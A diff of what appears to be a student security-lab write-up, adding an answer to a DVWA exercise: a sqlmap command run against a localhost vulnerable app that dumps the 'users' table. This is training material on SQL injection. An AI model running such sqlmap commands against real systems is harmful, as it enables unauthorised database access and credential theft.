@@ -125,9 +125,13 @@ Address of address of environment variable SHELLCODE is 0x0804846b
 
 **Question 1**: 
 Use sqlmap to get information about all available databases
-![alt text](image-5.png)
 
 **Answer 1**:
+```
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1" -D dvwa -T users --dump
+```
+![alt text](image-5.png)
+
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
